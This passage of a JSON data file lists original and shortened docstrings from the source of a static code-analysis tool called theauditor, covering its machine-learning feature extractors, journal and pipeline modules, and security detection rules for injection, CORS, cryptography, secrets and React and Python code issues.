    "original": "\"\"\"\n    Extract security pattern features from jwt_patterns and sql_queries tables.\n\n    Returns dict with keys: jwt_usage_count, sql_query_count, has_hardcoded_secret, has_weak_crypto\n    \"\"\"",
    "truncated": "\"\"\"Extract security pattern features from jwt_patterns and sql_queries tables.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Extract taint flow features from findings_consolidated table.\n\n    Returns dict with keys: critical_findings, high_findings, medium_findings, unique_cwe_count\n    \"\"\"",
    "truncated": "\"\"\"Extract taint flow features from findings_consolidated table.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Extract control flow complexity from cfg_blocks and cfg_edges tables.\n\n    Returns dict with keys: cfg_block_count, cfg_edge_count, cyclomatic_complexity\n    \"\"\"",
    "truncated": "\"\"\"Extract control flow complexity from cfg_blocks and cfg_edges tables.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Extract semantic import features to understand file purpose.\n\n    Returns dict with keys: has_http_import, has_db_import, has_auth_import, has_test_import\n    \"\"\"",
    "truncated": "\"\"\"Extract semantic import features to understand file purpose.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/loaders.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Load historical findings from findings_consolidated table in past runs.\n\n    Returns dict with keys: total_findings, critical_count, high_count, recurring_cwes\n    \"\"\"",
    "truncated": "\"\"\"Load historical findings from findings_consolidated table in past runs.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/loaders.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Convenience function to load all historical data at once.\n\n    Returns dict with keys: journal_stats, rca_stats, ast_stats, historical_findings, git_churn\n    \"\"\"",
    "truncated": "\"\"\"Convenience function to load all historical data at once.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if a transitional pattern has expired.\n\n        Returns:\n            True if pattern has passed its expiration date\n        \"\"\"",
    "truncated": "\"\"\"Check if a transitional pattern has expired.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get files with critical or high severity obsolete patterns.\n\n        Returns:\n            List of file paths that need immediate attention\n        \"\"\"",
    "truncated": "\"\"\"Get files with critical or high severity obsolete patterns.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Calculate migration progress statistics.\n\n        Returns:\n            Dictionary with migration progress metrics\n        \"\"\"",
    "truncated": "\"\"\"Calculate migration progress statistics.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize semantic context.\n\n        Args:\n            context_file: Path to YAML context file\n        \"\"\"",
    "truncated": "\"\"\"Initialize semantic context.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Close the journal file and optionally copy to history.\n\n        Args:\n            copy_to_history: Whether to copy journal to history directory\n        \"\"\"",
    "truncated": "\"\"\"Close the journal file and optionally copy to history.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize journal reader.\n\n        Args:\n            journal_path: Path to the journal file\n        \"\"\"",
    "truncated": "\"\"\"Initialize journal reader.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get statistics for file touches and failures.\n\n        Returns:\n            Dict mapping file paths to stats (touches, failures, successes)\n        \"\"\"",
    "truncated": "\"\"\"Get statistics for file touches and failures.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get statistics for pipeline phases.\n\n        Returns:\n            Dict mapping phase names to execution stats\n        \"\"\"",
    "truncated": "\"\"\"Get statistics for pipeline phases.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Journal system for tracking audit execution history.\n\nThis module provides functionality to write and read execution journals in NDJSON format.\nThe journal tracks all pipeline events, file touches, and results for ML training.\n\"\"\"",
    "truncated": "\"\"\"Journal system for tracking audit execution history.\"\"\""
  },
  {
    "file": "theauditor/js_init.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Deep merge overlay into base, only adding missing keys.\n\n    Existing values in base are never overwritten.\n    \"\"\"",
    "truncated": "\"\"\"Deep merge overlay into base, only adding missing keys.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize the semantic parser.\n\n        Args:\n            project_root: Absolute path to project root. If not provided, uses current directory.\n        \"\"\"",
    "truncated": "\"\"\"Initialize the semantic parser.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect the project's module type from package.json.\n\n        Returns:\n            \"module\" if ES modules are used, \"commonjs\" otherwise\n        \"\"\"",
    "truncated": "\"\"\"Detect the project's module type from package.json.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Convert path to appropriate format for node execution.\n\n        If using Windows node.exe from WSL, converts to Windows path.\n        Otherwise returns the path as-is.\n        \"\"\"",
    "truncated": "\"\"\"Convert path to appropriate format for node execution.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if TypeScript compiler is available in our sandbox.\n\n        CRITICAL: We ONLY use our own sandboxed TypeScript installation.\n        We do not check or use any user-installed versions.\n        \"\"\"",
    "truncated": "\"\"\"Check if TypeScript compiler is available in our sandbox.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"DEPRECATED: Single-file mode removed in Phase 5.\n\n        Raises:\n            RuntimeError: Always - single-file mode causes 512MB crash\n        \"\"\"",
    "truncated": "\"\"\"DEPRECATED: Single-file mode removed in Phase 5.\"\"\""
  },
  {
    "file": "theauditor/module_resolver.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Parse webpack.config.js for resolve.alias mappings.\n\n        Args:\n            webpack_config_path: Path to webpack configuration file\n        \"\"\"",
    "truncated": "\"\"\"Parse webpack.config.js for resolve.alias mappings.\"\"\""
  },
  {
    "file": "theauditor/pattern_loader.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get all loaded patterns.\n\n        Returns:\n            List of all patterns from all categories.\n        \"\"\"",
    "truncated": "\"\"\"Get all loaded patterns.\"\"\""
  },
  {
    "file": "theauditor/pattern_loader.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Validate all loaded patterns.\n\n        Returns:\n            Dictionary of validation errors by category.\n        \"\"\"",
    "truncated": "\"\"\"Validate all loaded patterns.\"\"\""
  },
  {
    "file": "theauditor/pipeline/renderer.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Wrapper that builds a fresh table on each Rich render cycle.\n\n    This enables live timer updates - Rich calls __rich_console__ on each\n    refresh (4x/second), and we recalculate elapsed times dynamically.\n    \"\"\"",
    "truncated": "\"\"\"Wrapper that builds a fresh table on each Rich render cycle.\"\"\""
  },
  {
    "file": "theauditor/pipeline/renderer.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Live dashboard using Rich library.\n\n    Sequential stages: Update table row immediately\n    Parallel stages: Buffer output, flush atomically when track completes\n    \"\"\"",
    "truncated": "\"\"\"Live dashboard using Rich library.\"\"\""
  },
  {
    "file": "theauditor/pipeline/structures.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Result of a single pipeline phase execution.\n\n    Provides strongly-typed return value instead of loose dicts.\n    JSON-serializable for MCP/AI consumption.\n    \"\"\"",
    "truncated": "\"\"\"Result of a single pipeline phase execution.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Archive plan (mark as archived).\n\n        Args:\n            plan_id: ID of plan to archive\n        \"\"\"",
    "truncated": "\"\"\"Archive plan (mark as archived).\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_JSX_RULE.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Pattern definitions for JSX security analysis.\n\n    These patterns detect issues specific to JSX syntax that are lost\n    when JSX is transformed to React.createElement() calls.\n    \"\"\"",
    "truncated": "\"\"\"Pattern definitions for JSX security analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_JSX_RULE.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect dynamic JSX element injection: <{UserComponent} />\n\n    This pattern is LOST in transformed AST (becomes createElement call).\n    Can only be detected in preserved JSX.\n    \"\"\"",
    "truncated": "\"\"\"Detect dynamic JSX element injection: <{UserComponent} />\"\"\""
  },
  {
    "file": "theauditor/rules/__init__.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"TheAuditor AST-based rule definitions.\n\nThis package contains high-fidelity AST-based rules for detecting\nsecurity vulnerabilities, code quality issues, and anti-patterns.\n\"\"\"",
    "truncated": "\"\"\"TheAuditor AST-based rule definitions.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Base contracts for rule standardization.\n\nThis module defines the universal interface that ALL rules must follow.\nCreated as part of the Great Refactor to eliminate signature chaos.\n\"\"\"",
    "truncated": "\"\"\"Base contracts for rule standardization.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/unused_dependencies.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get declared dependencies with their file locations.\n\n    Returns:\n        Dict mapping package name -> (file_path, is_dev_dep, is_peer_dep)\n    \"\"\"",
    "truncated": "\"\"\"Get declared dependencies with their file locations.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/unused_dependencies.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get all imported package names (normalized).\n\n    Returns:\n        Set of imported package names (lowercase, base package only)\n    \"\"\"",
    "truncated": "\"\"\"Get all imported package names (normalized).\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/injection.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"GraphQL Injection Detection - Database-First Taint Analysis.\n\nDetects GraphQL arguments flowing to SQL/command sinks without sanitization.\nUses graphql_execution_edges + taint analysis. NO regex fallbacks.\n\"\"\"",
    "truncated": "\"\"\"GraphQL Injection Detection - Database-First Taint Analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/mutation_auth.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"GraphQL Mutation Authentication Check - Database-First Approach.\n\nDetects mutations without authentication directives or resolver protections.\nPure SQL queries - NO file I/O.\n\"\"\"",
    "truncated": "\"\"\"GraphQL Mutation Authentication Check - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/nplus1.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"GraphQL N+1 Query Detection - CFG-Based Loop Analysis.\n\nDetects N+1 query patterns where resolvers execute DB queries inside loops.\nUses cfg_blocks + graphql_execution_edges. NO regex fallbacks.\n\"\"\"",
    "truncated": "\"\"\"GraphQL N+1 Query Detection - CFG-Based Loop Analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/overfetch.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"GraphQL Overfetch Detection - ORM Field Analysis.\n\nDetects resolvers fetching sensitive DB fields not exposed in GraphQL schema.\nUses orm_queries + graphql_fields comparison. NO regex fallbacks.\n\"\"\"",
    "truncated": "\"\"\"GraphQL Overfetch Detection - ORM Field Analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/logic/general_logic_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register logic-related patterns with the taint analysis registry.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register logic-related patterns with the taint analysis registry.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Dynamically discover ALL rules in /rules directory.\n\n        Returns:\n            Dictionary mapping category name to list of RuleInfo objects\n        \"\"\"",
    "truncated": "\"\"\"Dynamically discover ALL rules in /rules directory.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Run all standalone rules that don't need taint data.\n\n        Returns:\n            List of findings from standalone rules\n        \"\"\"",
    "truncated": "\"\"\"Run all standalone rules that don't need taint data.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Run rules that operate on the database.\n\n        Returns:\n            List of findings from database rules\n        \"\"\"",
    "truncated": "\"\"\"Run rules that operate on the database.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get statistics about discovered rules.\n\n        Returns:\n            Dictionary with rule statistics\n        \"\"\"",
    "truncated": "\"\"\"Get statistics about discovered rules.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/sequelize_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/sequelize_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of Sequelize ORM issues found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/sequelize_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if model has associations defined nearby.\n\n        Returns:\n            0 if no associations, 1 if maybe, 2 if definitely\n        \"\"\"",
    "truncated": "\"\"\"Check if model has associations defined nearby.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/sequelize_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register Sequelize-specific taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register Sequelize-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of concurrency issues found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect TOCTOU race conditions.\n\n        Schema: function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n        \"\"\"",
    "truncated": "\"\"\"Detect TOCTOU race conditions.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if there's lock protection nearby.\n\n        Schema: function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n        \"\"\"",
    "truncated": "\"\"\"Check if there's lock protection nearby.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Find async function calls not awaited.\n\n        Schema: function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n        \"\"\"",
    "truncated": "\"\"\"Find async function calls not awaited.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Find parallel operations with write operations.\n\n        Schema: function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n        \"\"\"",
    "truncated": "\"\"\"Find parallel operations with write operations.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Find thread lifecycle issues.\n\n        Schema: function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n        \"\"\"",
    "truncated": "\"\"\"Find thread lifecycle issues.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Find retry loops without exponential backoff.\n\n        Schema: cfg_blocks(id, file, function_name, block_type, start_line, end_line, condition_expr)\n                assignments(file, line, target_var, source_expr, source_vars, in_function)\n        \"\"\"",
    "truncated": "\"\"\"Find retry loops without exponential backoff.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if there's sleep in line range.\n\n        Schema: function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n        \"\"\"",
    "truncated": "\"\"\"Check if there's sleep in line range.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register concurrency-specific taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register concurrency-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_crypto_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_crypto_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of cryptography vulnerabilities found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_crypto_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register crypto-specific taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register crypto-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_deserialization_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_deserialization_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of deserialization vulnerabilities found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_deserialization_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register deserialization-specific taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register deserialization-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_injection_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_injection_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of injection vulnerabilities found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_injection_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register injection-specific taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register injection-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/react/component_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/react/component_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of React component issues found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/react/hooks_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/react/hooks_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of React hooks violations found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/react/render_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/react/render_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of React rendering issues found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/react/state_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/react/state_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of React state management issues found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if a string value is likely a secret.\n\n    This function performs computational analysis that cannot be\n    pre-indexed in the database (entropy calculation).\n    \"\"\"",
    "truncated": "\"\"\"Check if a string value is likely a secret.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register secret-related taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register secret-related taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/api_auth_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/security/api_auth_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of API authentication issues found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/security/api_auth_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register API auth-specific taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register API auth-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/cors_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with context and patterns.\n\n        Args:\n            context: Standard rule context with database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with context and patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/cors_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main entry point - runs all CORS vulnerability checks.\n\n        Returns:\n            List of CORS vulnerability findings\n        \"\"\"",
    "truncated": "\"\"\"Main entry point - runs all CORS vulnerability checks.\"\"\""
  },
  {
    "file": "theauditor/rules/security/cors_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register CORS-related taint patterns for flow analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register CORS-related taint patterns for flow analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/security/crypto_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect cryptographic vulnerabilities using schema contract patterns.\n\n    Implements 15+ crypto vulnerability patterns with unconditional execution.\n    All required tables guaranteed to exist by schema contract.\n    \"\"\"",
    "truncated": "\"\"\"Detect cryptographic vulnerabilities using schema contract patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/crypto_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register crypto-specific patterns with taint analyzer.\n\n    This allows the taint analyzer to track weak random sources\n    flowing into cryptographic operations.\n    \"\"\"",
    "truncated": "\"\"\"Register crypto-specific patterns with taint analyzer.\"\"\""
  },
  {
    "file": "theauditor/rules/security/input_validation_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with database context.\n\n        Args:\n            context: Rule context containing database path\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with database context.\"\"\""
  },
  {
    "file": "theauditor/rules/security/input_validation_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point.\n\n        Returns:\n            List of input validation vulnerabilities found\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/security/input_validation_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register input validation taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register input validation taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/pii_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect PII exposure issues using comprehensive international patterns.\n\n    Implements 25+ detection patterns across 15 PII categories with\n    support for 50+ countries and major privacy regulations.\n    \"\"\"",
    "truncated": "\"\"\"Detect PII exposure issues using comprehensive international patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/rate_limit_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect rate limiting misconfigurations using database queries.\n\n    Implements 15+ detection patterns for rate limiting issues including\n    middleware ordering, unprotected endpoints, bypassable keys, and more.\n    \"\"\"",
    "truncated": "\"\"\"Detect rate limiting misconfigurations using database queries.\"\"\""
  },
  {
    "file": "theauditor/rules/security/sourcemap_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize analyzer with context.\n\n        Args:\n            context: Rule context containing database and project paths\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with context.\"\"\""
  },
  {
    "file": "theauditor/rules/security/sourcemap_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main analysis entry point using hybrid approach.\n\n        Returns:\n            List of source map exposure findings\n        \"\"\"",
    "truncated": "\"\"\"Main analysis entry point using hybrid approach.\"\"\""
  },
  {
    "file": "theauditor/rules/security/sourcemap_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register source map related taint patterns.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register source map related taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/websocket_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"SQL-based WebSocket security analyzer.\n\nThis module detects WebSocket security issues by querying the indexed database\ninstead of traversing AST structures.\n\"\"\"",
    "truncated": "\"\"\"SQL-based WebSocket security analyzer.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_injection_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Register SQL injection sinks and sources for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance to populate\n    \"\"\"",
    "truncated": "\"\"\"Register SQL injection sinks and sources for taint analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Find UPDATE statements without WHERE clause.\n\n    FIXED: Moved WHERE check to SQL (was hiding bugs with LIMIT).\n    Uses word boundary regex to avoid matching 'somewhere' or 'elsewhere'.\n    \"\"\"",
    "truncated": "\"\"\"Find UPDATE statements without WHERE clause.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Find transactions that lack rollback in error handlers.\n\n    FIXED: Used Anti-Join pattern to eliminate N+1 query explosion.\n    Single query finds transactions WITHOUT matching rollbacks.\n    \"\"\"",
    "truncated": "\"\"\"Find transactions that lack rollback in error handlers.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/component_analyze.py",
    "line": -1,
    "original_lines": 5,
